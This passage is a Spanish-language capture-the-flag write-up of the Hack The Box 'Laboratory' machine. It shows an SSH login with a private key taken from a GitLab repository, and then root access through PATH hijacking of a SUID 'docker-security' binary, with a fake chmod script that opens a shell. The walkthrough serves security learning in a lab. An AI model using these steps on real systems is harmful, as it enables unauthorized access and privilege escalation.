git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ ls -la
total 8
drwxr-xr-x 4 git git 120 Jan 31 23:09 .
drwxr-xr-x 3 git git  80 Jan 31 22:45 ..
drwxr-xr-x 7 git git 240 Jan 31 23:09 .git
-rw-r--r-- 1 git git  37 Jan 31 23:09 README.md
-rw-r--r-- 1 git git 382 Jan 31 23:09 create_gitlab.sh
drwxr-xr-x 3 git git 100 Jan 31 23:09 dexter
```

En `create_gitlab.sh` tenemos la estructura del contenedor en el que estamos:

```bash
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ cat create_gitlab.sh 
#!/bin/bash
mkdir /srv/gitlab
export GITLAB_HOME=/srv/gitlab
docker run --detach \
  --hostname git.laboratory.htb \
  --publish 60443:443 --publish 60080:80 --publish 60022:22 \
  --name gitlab \
  --restart always \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  gitlab/gitlab-ce:latest
```

Si revisamos la carpeta `/dexter` obtenemos info muy valiosa:

```bash
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ cd dexter/
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ ls -la
total 8
drwxr-xr-x 3 git git 100 Jan 31 23:09 .
drwxr-xr-x 4 git git 120 Jan 31 23:09 ..
drwxr-xr-x 2 git git  80 Jan 31 23:09 .ssh
-rw-r--r-- 1 git git 102 Jan 31 23:09 recipe.url
-rw-r--r-- 1 git git 160 Jan 31 23:09 todo.txt
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ ls -la .ssh/
total 8
drwxr-xr-x 2 git git   80 Jan 31 23:09 .
drwxr-xr-x 3 git git  100 Jan 31 23:09 ..
-rw-r--r-- 1 git git  568 Jan 31 23:09 authorized_keys
-rw-r--r-- 1 git git 2601 Jan 31 23:09 id_rsa
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat .ssh/id_rsa
```

![298bash_revshGIT_bundle_idRSA](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_revshGIT_bundle_idRSA.png)

> Las llaves de `SSH` siempre son generadas en pares con una llamada llave privada y otra llamada llave pública. La llave privada solo es conocida por el usuario y debe ser guardada con cuidado. [ArchLinux.org](https://wiki.archlinux.org/index.php/SSH_keys_(Espa%C3%B1ol)#Informacion_preliminar)

¿Pero por qué con "cuidado"?

Como bien dice [ehu.eus](https://www.ehu.eus/ehusfera/ghym/2010/10/15/identificacion-automatica-en-ssh-usando-claves-rsa/) en su web, "Cuando tenemos que conectarnos habitualmente a un servidor Linux mediante SSH puede resultar muy tedioso tener que escribir la contraseña en cada sesión." Por lo que muchas veces las llaves SSH nos "facilitan" la vida, donde la llave pública (`id_rsa.pub`) le indica a la máquina que nos permita ingresar sin contraseña, pero solo si estamos agregados (`id_rsa.pub`) en el archivo `authorized_keys`. 

Digamos que en este caso deberíamos estar en el archivo `/home/dexter/.ssh/authorized_keys`, para conectarnos como `dexter` en el sistema... En el caso de `root` si estuvieramos en su archivo (../../rutaXD), pues si, nos conectaríamos como `root`. (Pero a esto no le podemos sacar provecho en este momento).

Pero donde la llave `id_rsa` le indica al sistema que prácticamente estamos proveyendo una contraseña (aunque ni tengamos indicios de como sea) del usuario al que le extraimos la llave, en este caso `dexter`..

Muy bien, tenemos la llave de acceso al sistema (`id_rsa`) presuntamente como el usuario `dexter`, probemos:

La guardamos en un archivo, lo llamaré `id_dexter`, le otorgamos permisos: `chmod 600 id_dexter` y ejecutamos mediante `SSH`:

```bash
–» ssh dexter@10.10.10.216 -i id_dexter
dexter@laboratory:~$ id
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
dexter@laboratory:~$ ls
user.txt
dexter@laboratory:~$ 
```

Perfecto, estamos dentro como `dexter`... Nice, pero antes de seguir, revisemos si los archivos del repositorio tienen algo más:

```bash
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat todo.txt
# DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into "docker compose"
# TODO: Permanently ban DeeDee from lab
```

Jmm, `look into "docker compose"` me llama la atención, no se si sea relevante, pero para tenerlo en cuenta (: El otro archivo tiene una URL:

```bash
git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat recipe.url 
[InternetShortcut]
URL=https://www.seriouseats.com/recipes/2016/04/french-omelette-cheese-recipe.html
```

Nada relevante. Enumeremos ahora como `dexter` dentro de la máquina...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Buscando por los archivos relacionados con el grupo `dexter` obtenemos esto:

```bash
dexter@laboratory:~$ find / -group dexter 2>/dev/null | grep -v proc
/usr/local/bin/docker-security
/home/dexter
/home/dexter/.local
/home/dexter/.local/share
/home/dexter/.local/share/nano
/home/dexter/.local/share/nano/search_history
/home/dexter/.profile
/home/dexter/.gnupg
/home/dexter/.gnupg/pubring.kbx
/home/dexter/.gnupg/trustdb.gpg
/home/dexter/.cache
/home/dexter/.cache/motd.legal-displayed
/home/dexter/.ssh
/home/dexter/user.txt
/home/dexter/.bashrc
/home/dexter/.bash_logout
dexter@laboratory:~$
```

* `/usr/local/bin/docker-security`.

Si vemos como está definido el archivo tenemos claro que debemos usarlo para escalar privilegios:

![298bash_revshDEX_dockerSec_lsLA](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_revshDEX_dockerSec_lsLA.png)

Tenemos un objeto creado por el usuario `root` y que cuando lo ejecutemos estaremos ejecutándolo como `root` no como `dexter` :O los famosos `SUID (Set User ID)`.

> SUID? ... it’s a way in UNIX-like operating systems of running a command as another user without providing credentials. [pentestpartners.com/exploiting-suid-executables](https://www.pentestpartners.com/security-blog/exploiting-suid-executables/).

Perfectoooooo... Pero ejecutándolo no tenemos ningún output, jmmm, que tipo de archivo es?:

```bash
dexter@laboratory:~$ file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
```

Un binario, inicialmente en internet no encontramos nada relacionado con él, probemos a ver si vemos alguna cadena de texto interesante. La herramienta `strings` no está instalada, intentemos con `cat`: 

```bash
dexter@laboratory:~$ cat /usr/local/bin/docker-security
ELF>p@9@8
...
...
H0zRx{UHH=H=]AWL=O,AVIAUIATAUH-@,SL)CHtLLDAHH9u[]A\A]A^A_chmod 700 /usr/bin/dockerchmod 660 /var/run/docker.sock<(X
    Rx
...
...
```

Vemos que presuntamente está cambiando los permisos de los archivos `/usr/bin/docker` y `/var/run/docker.sock`. También podemos verlo más claro con `ltrace` (nos ayuda a ver las llamadas que hace un programa sobre el sistema):

```bash
dexter@laboratory:~$ ltrace /usr/local/bin/docker-security
setuid(0)                                                                                                              = -1
setgid(0)                                                                                                              = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                 = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                 = 256
+++ exited (status 0) +++
```

Acá está más claro (creo yo :P), intenta cambiar los permisos, pero no permite la acción... Pero hay algo curioso, está llamando a `docker` por su ruta absoluta (`/usr/bin/docker`) y al archivo `docker.sock` también por su ruta completa (`/var/run/docker.sock`), pero `chmod` está siendo llamado en general...

Lo que pasa ahí es que cuando ejecutamos `chmod`, el sistema va a buscar el binario en todas las rutas del **PATH** (`echo $PATH`), ira recorriendo cada directorio y donde primero lo encuentre, será ese el que ejecute... Sabiendo esto, podemos aprovecharnos para hacer un `PATH Hijacking`, en el que crearemos un archivo llamado `chmod`, en su contenido le indicamos que nos genere una `Shell`, modificaremos el **PATH** para que si o si encuentre primero nuestro binario y lo ejecute. Consiguiendo así una Shell como el usuario administrador del sistema (`root`). Prendámosle fuego:

* Más info sobre `PATH Hijacking`. - [hackingarticles.in/linux-privesc-using-path-variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

...

#### ¬ Creamos el archivo `chmod`

```bash
dexter@laboratory:/dev/shm$ echo '#!/bin/bash' > chmod
dexter@laboratory:/dev/shm$ which bash
/usr/bin/bash
#Con esta linea obtendremos una `bash`.
dexter@laboratory:/dev/shm$ echo '/usr/bin/bash' >> chmod 

#Otorgamos permisos de ejecución.
dexter@laboratory:/dev/shm$ chmod +x chmod 

#Validamos.
dexter@laboratory:/dev/shm$ cat chmod 
#!/bin/bash
/usr/bin/bash
dexter@laboratory:/dev/shm$ 
```

Si lo probamos con `dexter` pasaría esto:

```bash
dexter@laboratory:/dev/shm$ /bin/sh
$ ./chmod
dexter@laboratory:/dev/shm$ 
```

#### ¬ Modificamos la variable `PATH`.

```bash
dexter@laboratory:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin

#La guardamos en otra variable por si algo.
dexter@laboratory:/dev/shm$ old_path=$PATH

#Le indicamos donde esta nuestro binario, esa ruta quedara de primero, en mi caso `/dev/shm`.
dexter@laboratory:/dev/shm$ export PATH=/dev/shm:$PATH

#La nueva variable `PATH`.
dexter@laboratory:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:/dev/shm$
```

Perfecto, ahora simplemente nos quedaría ejecutar el binario `/usr/local/bin/docker-security`.

#### ¬ Ejecutar el `PATH Hijacking`.

![298bash_revshDEX_dockerSec_rootSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298bash_revshDEX_dockerSec_rootSH.png)

Opa, si señor, somos `root` ツ Solo nos quedaría ver las flags:

![298flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298flags.png)

...

Y hemos acabado paaaaaaaaaarce.e 

Me gusto la máquina, mientras veía como jugar con los archivos `.bundle` me pareció que eso si debe ser muy real, a mucha gente se le debe colar/olvidar/dar-igual el archivo `id_rsa`. Jajaj o pues espero que no :P

Me encanta hacer `PATH Hijacking` así que eso también me subió mucho más el ánimo por la máquina...

Esto es todo por ahora, muchas gracias por pasarte y leer y nada, a seguir rompiendo todo ♥